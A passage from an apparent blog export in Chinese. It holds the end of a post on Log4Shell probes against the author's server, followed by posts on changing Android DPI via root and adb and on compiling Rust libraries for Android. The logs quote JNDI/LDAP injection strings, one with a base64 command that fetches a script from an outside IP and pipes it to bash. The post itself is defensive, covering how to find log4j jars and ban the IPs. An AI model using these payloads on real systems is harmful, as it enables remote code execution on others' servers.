class=\"variable\">$&#123;jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==&#125;</span> HTTP/1.1&quot;</span> 200 1307</span><br><span class=\"line\">170.210.45.163 - - [26/Dec/2021:08:32:29 +0800] <span class=\"string\">&quot;GET /<span class=\"variable\">$&#123;jndi:ldap://121.140.99.236:1389/Exploit&#125;</span> HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">195.54.160.149 - - [27/Dec/2021:03:06:53 +0800] <span class=\"string\">&quot;GET /?x=<span class=\"variable\">$&#123;jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==&#125;</span> HTTP/1.1&quot;</span> 200 1307</span><br><span class=\"line\">175.6.210.66 - - [31/Dec/2021:00:53:40 +0800] <span class=\"string\">&quot;GET /<span class=\"variable\">$&#123;jndi:ldap://121.140.99.236:1389/Exploit&#125;</span> HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:08 +0800] <span class=\"string\">&quot;POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:09 +0800] <span class=\"string\">&quot;GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:27 +0800] <span class=\"string\">&quot;POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:28 +0800] <span class=\"string\">&quot;GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1&quot;</span> 404 196</span><br></pre></td></tr></table></figure>\n\n<p>天南海北的IP地址，我真是谢谢你们光顾啊。</p>\n<p>由于我的服务器并没有运行什么复杂的Web应用，所以问题应该不大，不然我估计连ssh都登不进去了。</p>\n<ol>\n<li>不过，我们还是要排查一下现状，先检查项目依赖库有没有log4j2，版本是否更新到了修复版本。我的项目都是个人开发的小玩意，所以没用到这个玩意。</li>\n<li>到关键目录中检索jar包，尤其是基于Java开发的，比如Apache HTTP目录、Tomcat目录以及一些自定义的正在运行的Java程序：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 大概看下有哪些进程</span></span><br><span class=\"line\">ps -ef | grep java</span><br><span class=\"line\"><span class=\"comment\"># 到关键目录下直接find库包，一旦发现散落的jar，要么更新要么删里面的漏洞class</span></span><br><span class=\"line\">find . -name <span class=\"string\">&quot;log4j*&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>通过上述的access访问日志，看看哪些疯子在高频攻击，直接把IP或者IP段给ban了，让他搁这儿装逼：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 如果用的是比较老的系统，比如Ubuntu 16.04之类的，多半还是iptables</span></span><br><span class=\"line\">iptables -I INPUT -s 78.31.67.151 -j DROP</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果是用的防火墙，比如CentOS 7上面</span></span><br><span class=\"line\">firewall-cmd --zone=public --add-rich-rule <span class=\"string\">&#x27;rule family=&quot;ipv4&quot; source address=&quot;78.31.67.151&quot; reject&#x27;</span> --permanent</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>如果你还是不安心，先关机吧哈哈哈，断网才是终极大法，反正是个人网站。避避风头，把修复措施研究透彻，保证漏洞完全无法复现，再开机。</li>\n</ol>\n"},{"layout":"post","title":"Android手机如何修改DPI触发平板模式","subtitle":"从最根本动手。","date":"2022-01-27T16:00:00.000Z","author":"YSY","header-img":"img/404-bg.jpg","catalog":true,"_content":"\n### 前言\n\n目前，微信可以支持平板和手机同时登录，不过并不是所有人都有Android平板设备。实际上，我们可以修改系统文件来达到目的。\n\n我看了下网上（主要是酷安社区）很多方法其实都已经过时了，包括一些修改工具App。所以你以为改了实际上对微信没用，会发现其他软件都受dpi影响了，但是打开微信还是正常的手机分辨率，也就触发不了平板登录。\n\n### 分析\n\n下面我简单说一下原因，主要是很多ROM随着版本升级，可能那些系统配置的参数字段名称已经变了，如果大家还是一味地改以前的参数自然就没有效果，开发那些工具App的朋友们也不能保证及时更新这些修改。\n\n以我的测试机器Redmi Note 9 Pro为例，使用工具修改dpi为280之后（原dpi为440），会发现 `/system/build.prop` 文件内容末尾追加了 `ro.sf.lcd_density=280`，这很明显不是修改而是新增，说明搭载MIUI 13最新开发版的Note 9 Pro对应的配置参数不是这个。\n\n### 解决\n\n解决方法非常简单，先保证手机已经ROOT，然后拉出配置文件：\n\n```bash\nadb root\nadb remount\nadb disable-verity\nadb pull /system/build.prop\n```\n\n注意，如果你是第一次执行 `adb disable-verity` 命令，最好重启一下手机。\n\n这里拉出来prop文件是为了方便检索字段和修改内容，修改之前记得备份原文件。打开文件后直接搜索 `density` ，会发现：\n\n```bash\n……\npersist.miui.density_v2=440\n……\n```\n\n显而易见，最新的MIUI系统使用了新的字段来配置dpi，而不是以前那个 `ro.sf.lcd_density`，所以直接修改这个就行了，改成280，保存文件，然后push回手机：\n\n```bash\nadb push build.prop /system/\n```\n\n重启就成功了。看看效果：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/667b993406aa418996a27f2422f7df37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n当然，上述所说的改dpi的方式有利有弊，好处是比较通用，不需要改机型（因为不通过三方工具的话，手动改机型需要具体的机型代号，如下所示，改错了或许开不了机），缺点呢当然就是dpi会影响所有应用（不适合主力机），如果不想其他应用受影响还是改机型比较方便。\n\n```bash\nro.product.system.brand=Xiaomi\nro.product.system.device=elish\nro.product.system.manufacturer=Xiaomi\nro.product.system.model=M2105K81AC\nro.product.system.name=elish\nro.product.system.marketname=Xiaomi Pad 5 Pro\n```\n\n### 不是MIUI怎么办\n\n大家必须要知道的是，这些系统配置并不是一成不变的，可能某个Android大版本升级或者厂商自定义就会导致不同机型都不一样。所以还是自己动手去查看文件，搜索相关的关键字，来修改就行了。\n\n此外，我这里跳过了ROOT这一步，大多数手机并不像MIUI开发版ROOT这么简单，主流方法会通过刷三方Rec和Magisk来ROOT，如果你具备这些前提条件，可能本文对你也没什么用了，因为成熟的模块或工具更好用（如果一直有人维护的话）。\n","source":"_posts/2022-01-28-Android手机如何修改DPI触发平板模式.md","raw":"---\nlayout:     post\ntitle:      Android手机如何修改DPI触发平板模式\nsubtitle:   从最根本动手。\ndate:       2022-01-28\nauthor:     YSY\nheader-img: img/404-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - 鼓捣折腾\n---\n\n### 前言\n\n目前，微信可以支持平板和手机同时登录，不过并不是所有人都有Android平板设备。实际上，我们可以修改系统文件来达到目的。\n\n我看了下网上（主要是酷安社区）很多方法其实都已经过时了，包括一些修改工具App。所以你以为改了实际上对微信没用，会发现其他软件都受dpi影响了，但是打开微信还是正常的手机分辨率，也就触发不了平板登录。\n\n### 分析\n\n下面我简单说一下原因，主要是很多ROM随着版本升级，可能那些系统配置的参数字段名称已经变了，如果大家还是一味地改以前的参数自然就没有效果，开发那些工具App的朋友们也不能保证及时更新这些修改。\n\n以我的测试机器Redmi Note 9 Pro为例，使用工具修改dpi为280之后（原dpi为440），会发现 `/system/build.prop` 文件内容末尾追加了 `ro.sf.lcd_density=280`，这很明显不是修改而是新增，说明搭载MIUI 13最新开发版的Note 9 Pro对应的配置参数不是这个。\n\n### 解决\n\n解决方法非常简单，先保证手机已经ROOT，然后拉出配置文件：\n\n```bash\nadb root\nadb remount\nadb disable-verity\nadb pull /system/build.prop\n```\n\n注意，如果你是第一次执行 `adb disable-verity` 命令，最好重启一下手机。\n\n这里拉出来prop文件是为了方便检索字段和修改内容，修改之前记得备份原文件。打开文件后直接搜索 `density` ，会发现：\n\n```bash\n……\npersist.miui.density_v2=440\n……\n```\n\n显而易见，最新的MIUI系统使用了新的字段来配置dpi，而不是以前那个 `ro.sf.lcd_density`，所以直接修改这个就行了，改成280，保存文件，然后push回手机：\n\n```bash\nadb push build.prop /system/\n```\n\n重启就成功了。看看效果：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/667b993406aa418996a27f2422f7df37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n当然，上述所说的改dpi的方式有利有弊，好处是比较通用，不需要改机型（因为不通过三方工具的话，手动改机型需要具体的机型代号，如下所示，改错了或许开不了机），缺点呢当然就是dpi会影响所有应用（不适合主力机），如果不想其他应用受影响还是改机型比较方便。\n\n```bash\nro.product.system.brand=Xiaomi\nro.product.system.device=elish\nro.product.system.manufacturer=Xiaomi\nro.product.system.model=M2105K81AC\nro.product.system.name=elish\nro.product.system.marketname=Xiaomi Pad 5 Pro\n```\n\n### 不是MIUI怎么办\n\n大家必须要知道的是，这些系统配置并不是一成不变的，可能某个Android大版本升级或者厂商自定义就会导致不同机型都不一样。所以还是自己动手去查看文件，搜索相关的关键字，来修改就行了。\n\n此外，我这里跳过了ROOT这一步，大多数手机并不像MIUI开发版ROOT这么简单，主流方法会通过刷三方Rec和Magisk来ROOT，如果你具备这些前提条件，可能本文对你也没什么用了，因为成熟的模块或工具更好用（如果一直有人维护的话）。\n","slug":"Android手机如何修改DPI触发平板模式","published":1,"updated":"2024-03-25T07:31:25.987Z","comments":1,"photos":[],"link":"","_id":"cluaufh1i004jthe6aqu8hwx7","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>目前，微信可以支持平板和手机同时登录，不过并不是所有人都有Android平板设备。实际上，我们可以修改系统文件来达到目的。</p>\n<p>我看了下网上（主要是酷安社区）很多方法其实都已经过时了，包括一些修改工具App。所以你以为改了实际上对微信没用，会发现其他软件都受dpi影响了，但是打开微信还是正常的手机分辨率，也就触发不了平板登录。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>下面我简单说一下原因，主要是很多ROM随着版本升级，可能那些系统配置的参数字段名称已经变了，如果大家还是一味地改以前的参数自然就没有效果，开发那些工具App的朋友们也不能保证及时更新这些修改。</p>\n<p>以我的测试机器Redmi Note 9 Pro为例，使用工具修改dpi为280之后（原dpi为440），会发现 <code>/system/build.prop</code> 文件内容末尾追加了 <code>ro.sf.lcd_density=280</code>，这很明显不是修改而是新增，说明搭载MIUI 13最新开发版的Note 9 Pro对应的配置参数不是这个。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>解决方法非常简单，先保证手机已经ROOT，然后拉出配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb root</span><br><span class=\"line\">adb remount</span><br><span class=\"line\">adb disable-verity</span><br><span class=\"line\">adb pull /system/build.prop</span><br></pre></td></tr></table></figure>\n\n<p>注意，如果你是第一次执行 <code>adb disable-verity</code> 命令，最好重启一下手机。</p>\n<p>这里拉出来prop文件是为了方便检索字段和修改内容，修改之前记得备份原文件。打开文件后直接搜索 <code>density</code> ，会发现：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……</span><br><span class=\"line\">persist.miui.density_v2=440</span><br><span class=\"line\">……</span><br></pre></td></tr></table></figure>\n\n<p>显而易见，最新的MIUI系统使用了新的字段来配置dpi，而不是以前那个 <code>ro.sf.lcd_density</code>，所以直接修改这个就行了，改成280，保存文件，然后push回手机：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb push build.prop /system/</span><br></pre></td></tr></table></figure>\n\n<p>重启就成功了。看看效果：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/667b993406aa418996a27f2422f7df37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"在这里插入图片描述\"></p>\n<p>当然，上述所说的改dpi的方式有利有弊，好处是比较通用，不需要改机型（因为不通过三方工具的话，手动改机型需要具体的机型代号，如下所示，改错了或许开不了机），缺点呢当然就是dpi会影响所有应用（不适合主力机），如果不想其他应用受影响还是改机型比较方便。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ro.product.system.brand=Xiaomi</span><br><span class=\"line\">ro.product.system.device=elish</span><br><span class=\"line\">ro.product.system.manufacturer=Xiaomi</span><br><span class=\"line\">ro.product.system.model=M2105K81AC</span><br><span class=\"line\">ro.product.system.name=elish</span><br><span class=\"line\">ro.product.system.marketname=Xiaomi Pad 5 Pro</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"不是MIUI怎么办\"><a href=\"#不是MIUI怎么办\" class=\"headerlink\" title=\"不是MIUI怎么办\"></a>不是MIUI怎么办</h3><p>大家必须要知道的是，这些系统配置并不是一成不变的，可能某个Android大版本升级或者厂商自定义就会导致不同机型都不一样。所以还是自己动手去查看文件，搜索相关的关键字，来修改就行了。</p>\n<p>此外，我这里跳过了ROOT这一步，大多数手机并不像MIUI开发版ROOT这么简单，主流方法会通过刷三方Rec和Magisk来ROOT，如果你具备这些前提条件，可能本文对你也没什么用了，因为成熟的模块或工具更好用（如果一直有人维护的话）。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>目前，微信可以支持平板和手机同时登录，不过并不是所有人都有Android平板设备。实际上，我们可以修改系统文件来达到目的。</p>\n<p>我看了下网上（主要是酷安社区）很多方法其实都已经过时了，包括一些修改工具App。所以你以为改了实际上对微信没用，会发现其他软件都受dpi影响了，但是打开微信还是正常的手机分辨率，也就触发不了平板登录。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>下面我简单说一下原因，主要是很多ROM随着版本升级，可能那些系统配置的参数字段名称已经变了，如果大家还是一味地改以前的参数自然就没有效果，开发那些工具App的朋友们也不能保证及时更新这些修改。</p>\n<p>以我的测试机器Redmi Note 9 Pro为例，使用工具修改dpi为280之后（原dpi为440），会发现 <code>/system/build.prop</code> 文件内容末尾追加了 <code>ro.sf.lcd_density=280</code>，这很明显不是修改而是新增，说明搭载MIUI 13最新开发版的Note 9 Pro对应的配置参数不是这个。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>解决方法非常简单，先保证手机已经ROOT，然后拉出配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb root</span><br><span class=\"line\">adb remount</span><br><span class=\"line\">adb disable-verity</span><br><span class=\"line\">adb pull /system/build.prop</span><br></pre></td></tr></table></figure>\n\n<p>注意，如果你是第一次执行 <code>adb disable-verity</code> 命令，最好重启一下手机。</p>\n<p>这里拉出来prop文件是为了方便检索字段和修改内容，修改之前记得备份原文件。打开文件后直接搜索 <code>density</code> ，会发现：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……</span><br><span class=\"line\">persist.miui.density_v2=440</span><br><span class=\"line\">……</span><br></pre></td></tr></table></figure>\n\n<p>显而易见，最新的MIUI系统使用了新的字段来配置dpi，而不是以前那个 <code>ro.sf.lcd_density</code>，所以直接修改这个就行了，改成280，保存文件，然后push回手机：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb push build.prop /system/</span><br></pre></td></tr></table></figure>\n\n<p>重启就成功了。看看效果：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/667b993406aa418996a27f2422f7df37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"在这里插入图片描述\"></p>\n<p>当然，上述所说的改dpi的方式有利有弊，好处是比较通用，不需要改机型（因为不通过三方工具的话，手动改机型需要具体的机型代号，如下所示，改错了或许开不了机），缺点呢当然就是dpi会影响所有应用（不适合主力机），如果不想其他应用受影响还是改机型比较方便。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ro.product.system.brand=Xiaomi</span><br><span class=\"line\">ro.product.system.device=elish</span><br><span class=\"line\">ro.product.system.manufacturer=Xiaomi</span><br><span class=\"line\">ro.product.system.model=M2105K81AC</span><br><span class=\"line\">ro.product.system.name=elish</span><br><span class=\"line\">ro.product.system.marketname=Xiaomi Pad 5 Pro</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"不是MIUI怎么办\"><a href=\"#不是MIUI怎么办\" class=\"headerlink\" title=\"不是MIUI怎么办\"></a>不是MIUI怎么办</h3><p>大家必须要知道的是，这些系统配置并不是一成不变的，可能某个Android大版本升级或者厂商自定义就会导致不同机型都不一样。所以还是自己动手去查看文件，搜索相关的关键字，来修改就行了。</p>\n<p>此外，我这里跳过了ROOT这一步，大多数手机并不像MIUI开发版ROOT这么简单，主流方法会通过刷三方Rec和Magisk来ROOT，如果你具备这些前提条件，可能本文对你也没什么用了，因为成熟的模块或工具更好用（如果一直有人维护的话）。</p>\n"},{"layout":"post","title":"Rust为Android应用编译so库","subtitle":"新东西来啦！","date":"2022-02-10T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"_content":"\n### 前言\n\nRust是个好东西，Google也开始把它用于AOSP了。我们开发应用同样也可以使用Rust来编写原本为C++的Native代码。网上搜罗一圈，入门的文档不多不少，这里稍微归纳整理一下吧，毕竟Hello World是人类的一大步。\n\n### 安装Rust\n\nRust的文档真的非常棒，目前的翻译版本也几乎满足所有学习需求。安装很简单，参考官网（[Rust-lang.org](https://www.rust-lang.org/zh-CN/learn/get-started)）即可，一行命令：\n\n```bash\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n```\n\n### 配置NDK\n\n1、先确保你在Android Studio的SDK Manager中下载安装好了NDK相关的工具包，基操就不赘述了。\n\n2、默认目录一般都在 `/Users/你的用户名/Library/Android/sdk/ndk-bundle` 这个位置，用户目录可以用 `${HOME}` 代替。当然，如果你的SDK在其他位置，按你的来即可。\n\n在任意处创建一个名为NDK的目录（名字随意，也可不叫NDK），然后运行NDK工具包中的py脚本以编译NDK开发环境：\n\n```bash\ncd ~\nmkdir NDK\n# 不同架构参数不同，按需配置即可，比如我就只需要arm64\n# api参数最好按你的应用targetSDK的版本号来，比如我这里是30\n# Python版本我这里是3.8，如果你是Python 2.x的话，不确定能否运行成功\npython ${HOME}/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --arch arm64 --install-dir NDK/arm64\npython ${HOME}/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --arch arm --install-dir NDK/arm\npython ${HOME}/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --arch x86 --install-dir NDK/x86\n```\n\n3、编辑Rust环境的配置文件即 `~/.cargo/config` ，若无，新建即可，并添加内容：\n\n```bash\n# 同样是按需配置，如果你不需要编译其他架构，就不添加\n# 相关路径最好写绝对路径，此处若用${HOME}不生效\n[target.aarch64-linux-android]\nar = \"/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-ar\"\nlinker = \"/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-clang\"\n\n[target.armv7-linux-androideabi]\nar = \"/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-ar\"\nlinker = \"/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-clang\"\n\n[target.i686-linux-android]\nar = \"/Users/你的用户名/NDK/x86/bin/i686-linux-android-ar\"\nlinker = \"/Users/你的用户名/NDK/x86/bin/i686-linux-android-clang\"\n```\n\n4、添加编译工具链，和第3步中配置的对应：\n\n```bash\nrustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android\n```\n\n### 编写Demo\n\n配置好各种环境后，就可以开始Coding了，先生成一个Rust的lib空项目，`rust-android-libs` 是我的自定义命名：\n\n```bash\ncargo new rust-android-libs --lib\n```\n\n进入目录，编辑Cargo.toml配置文件，直接修改如下：\n\n```toml\n[package]\nname = \"rust-android-libs\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\njni = { version = \"0.19.0\", default-features = false }\n\n[lib]\ncrate_type = [\"cdylib\"]\n```\n\n这里Rust的JNI版本，可以参考官方文档：[Docs.rs](https://docs.rs/releases/search?query=jni)，目前最新为0.19.0，下面的crate_type配置也是按文档来的。\n\n3、编写Rust代码，在src/lib.rs文件中：\n\n```rust\n#![cfg(target_os = \"android\")]\n#![allow(non_snake_case)]\n\nuse jni::JNIEnv;\nuse jni::objects::{JClass, JString};\nuse jni::sys::jstring;\n\n#[no_mangle]\npub extern \"C\" fn Java_com_xxx_xxx_Yyy_getTestStr(\n    env: JNIEnv, _: JClass,\n) -> jstring {\n    env.new_string(\"Hello World!\")\n        .expect(\"Couldn't create java string!\")\n        .into_inner()\n}\n\n#[no_mangle]\npub extern \"C\" fn Java_com_xxx_xxx_Yyy_getTestStrWithInput(\n    env: JNIEnv, _: JClass, input: JString,\n) -> jstring {\n    let input: String = env.get_string(input)\n        .expect(\"Couldn't get java string!\")\n        .into();\n    let output = env.new_string(format!(\"Hello, {}!\", input))\n        .expect(\"Couldn't create java string!\");\n    output.into_inner()\n}\n```\n\n如上所示，我们编写了两个方法，一个是直接返回一个String，另一个是带参数返回拼接后的String。方法的命名规则和写C++的JNI代码一样，以此处为例，说明我们需要在Java/Kotlin代码中对应创建一个包名为 `com.xxx.xxx`，名为 `Yyy` 的类，其中有两个方法：\n\n```kotlin\npackage com.xxx.xxx\n\nobject Yyy {\n    init {\n        // 因为等会儿编译的so产物为librust_android_libs.so，所以此处加载命名如下\n        System.loadLibrary(\"rust_android_libs\")\n    }\n\n    external fun getTestStr(): String\n    external fun getTestStrWithInput(input: String): String\n}\n```\n\n4、编译Rust项目，按需要的架构编译即可，如果不用模拟器的话，一般都不用考虑x86：\n\n```bash\ncargo build --target aarch64-linux-android --release\ncargo build --target armv7-linux-androideabi --release\ncargo build --target i686-linux-android --release\n```\n\n编译成功后在项目的 `/target/aarch64-linux-android/release/librust_android_libs.so` 路径下可以找到想要的so文件，把它复制到Android项目中。\n\n一般来说都在 `.../app/src/main/jniLibs/arm64-v8a/` 这样的目录下，按你需要的架构来即可。同时记得配置build.gradle：\n\n```groovy\n...\nandroid {\n    compileSdkVersion 30\n    defaultConfig {\n        ...\n\n        ndk {\n            abiFilters 'arm64-v8a'\n        }\n    }\n\n    // 如果你的AGP插件版本不小于7.0，可能需要添加\n    packagingOptions {\n        jniLibs {\n            useLegacyPackaging = true\n        }\n    }\n}\n...\n```\n\n### 后话\n\n整个流程下来，还是有点小繁琐的，同时也整理几个问题吧：\n\n1、同样的代码逻辑，Rust编译出来的so库比C++编译的要大很多，以我上面的代码为例，64位架构大约在**4MB**左右，32位在3MB多一点，而C++编译的产物分别为**1MB**多和900多KB，这对包体积大小敏感的项目来说，差距还是不小的。不知道有没有优化的方法，由于我也是刚接触Rust，还不太了解。\n\n```bash\n# 我们可以用strings命令来对比两种环境编译出来的so结构\nstrings librust_android_libs.so\n```\n\n2、复杂的业务逻辑肯定需要调试，以方便定位问题，但以我们上面的例子来看，Rust项目和Android是分开的，如何像C++代码那样直接在Android项目中整合编译并断点调试，还需要进一步探索。\n\n3、Google和Rust官方对于适配到Android应用项目的相关文档还不是很丰富，我们在Studio中New Project的时候，就可以看见有Native C++的模板可以选择，这给了初学者很好的示范，希望以后也有Native Rust之类的模板。\n","source":"_posts/2022-02-11-Rust为Android应用编译so库.md","raw":"---\nlayout:     post\ntitle:      Rust为Android应用编译so库\nsubtitle:   新东西来啦！\ndate:       2022-02-11\nauthor:     YSY\nheader-style: text\ncatalog: true\ntags:\n    - Android\n    - Rust\n---\n\n### 前言\n\nRust是个好东西，Google也开始把它用于AOSP了。我们开发应用同样也可以使用Rust来编写原本为C++的Native代码。网上搜罗一圈，入门的文档不多不少，这里稍微归纳整理一下吧，毕竟Hello World是人类的一大步。\n\n### 安装Rust\n\nRust的文档真的非常棒，目前的翻译版本也几乎满足所有学习需求。安装很简单，参考官网（[Rust-lang.org](https://www.rust-lang.org/zh-CN/learn/get-started)）即可，一行命令：\n\n```bash\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n```\n\n### 配置NDK\n\n1、先确保你在Android Studio的SDK Manager中下载安装好了NDK相关的工具包，基操就不赘述了。\n\n2、默认目录一般都在 `/Users/你的用户名/Library/Android/sdk/ndk-bundle` 这个位置，用户目录可以用 `${HOME}` 代替。当然，如果你的SDK在其他位置，按你的来即可。\n\n在任意处创建一个名为NDK的目录（名字随意，也可不叫NDK），然后运行NDK工具包中的py脚本以编译NDK开发环境：\n\n```bash\ncd ~\nmkdir NDK\n# 不同架构参数不同，按需配置即可，比如我就只需要arm64\n# api参数最好按你的应用targetSDK的版本号来，比如我这里是30\n# Python版本我这里是3.8，如果你是Python 2.x的话，不确定能否运行成功\npython ${HOME}/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --arch arm64 --install-dir NDK/arm64\npython ${HOME}/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --arch arm --install-dir NDK/arm\npython ${HOME}/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --arch x86 --install-dir NDK/x86\n```\n\n3、编辑Rust环境的配置文件即 `~/.cargo/config` ，若无，新建即可，并添加内容：\n\n```bash\n# 同样是按需配置，如果你不需要编译其他架构，就不添加\n# 相关路径最好写绝对路径，此处若用${HOME}不生效\n[target.aarch64-linux-android]\nar = \"/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-ar\"\nlinker = \"/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-clang\"\n\n[target.armv7-linux-androideabi]\nar = \"/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-ar\"\nlinker = \"/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-clang\"\n\n[target.i686-linux-android]\nar = \"/Users/你的用户名/NDK/x86/bin/i686-linux-android-ar\"\nlinker = \"/Users/你的用户名/NDK/x86/bin/i686-linux-android-clang\"\n```\n\n4、添加编译工具链，和第3步中配置的对应：\n\n```bash\nrustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android\n```\n\n### 编写Demo\n\n配置好各种环境后，就可以开始Coding了，先生成一个Rust的lib空项目，`rust-android-libs` 是我的自定义命名：\n\n```bash\ncargo new rust-android-libs --lib\n```\n\n进入目录，编辑Cargo.toml配置文件，直接修改如下：\n\n```toml\n[package]\nname = 